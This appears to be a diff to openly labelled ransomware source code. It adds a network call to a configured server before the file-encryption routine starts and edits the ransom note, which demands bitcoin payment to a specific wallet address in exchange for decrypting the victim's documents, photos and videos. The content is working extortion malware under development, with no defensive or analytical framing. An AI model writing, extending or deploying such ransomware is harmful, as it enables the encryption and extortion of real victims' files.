@@ -145,6 +145,11 @@ ransom0 = ransom0()
 
 
 def StartRansom():
+    con = http.client.HTTPConnection(url, 8000)
+    con.request('GET', '/')
+    con.getresponse()
+    con.close()
+
     try:
         ransom0.FindFiles()
         filepath = 'logs/path.txt'
@@ -171,11 +176,14 @@ PATH = os.getcwd()
 
 
 def DECRYPT_FILE():
-    print('YOUR FILES HAVE BEEN ENCRYPTED')
-    print('YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
-    print('to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of transfer and your DIGIT to mail@mail.com')
+    print('')
+    print('!!! YOUR FILES HAVE BEEN ENCRYPTED !!!')
+    print('')
+    print('YOUR IMPORTANT DOCUMENTS, DATA, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
+    print('to decrypt them, send 50$ in bitcoin to 346n4apJCQPg2XAXU3bfNQTogz4PyTkrEf, and them send proof of transfer and your DIGIT to mail@mail.com')
+    print('')
     print('YOUR DIGIT IS {}'.format(digits))
-    pretty_key = input("Your decryption key: ")
+    pretty_key = input("Input your decryption key: ")
 
     def decrypt(filename):
         f = Crypto(pretty_key=pretty_key)
